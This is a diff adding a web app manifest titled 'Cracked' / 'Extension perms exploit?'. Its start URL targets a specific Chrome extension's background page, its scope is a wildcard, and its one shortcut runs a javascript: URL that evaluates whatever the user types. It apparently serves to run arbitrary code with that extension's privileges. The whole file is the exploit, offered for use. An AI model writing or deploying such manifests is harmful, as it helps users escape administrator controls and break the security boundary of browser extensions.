@@ -1,0 +1,27 @@
+{
+  "short_name": "Cracked",
+  "name": "Extension perms exploit?",
+  "icons": [
+    {
+      "src": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkztS4tpYYZVHM8TpDytGtSptIsFJAi18NOwM9_XE&s",
+      "type": "image/png",
+      "sizes": "122x122"
+    }
+  ],
+  "id": "/?source=pwa",
+  "start_url": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/_generated_background_page.html",
+  "background_color": "#3367D6",
+  "display": "standalone",
+  "scope": "*",
+  "theme_color": "#3367D6",
+  "shortcuts": [
+    {
+      "name": "Run a command",
+      "short_name": "Give it a go!",
+      "description": "Run a command",
+      "url": "javascript:alert(eval(window.prompt(\"> \")));",
+      "icons": null
+    }
+  ],
+  "description": "Cracked glitch!"
+}
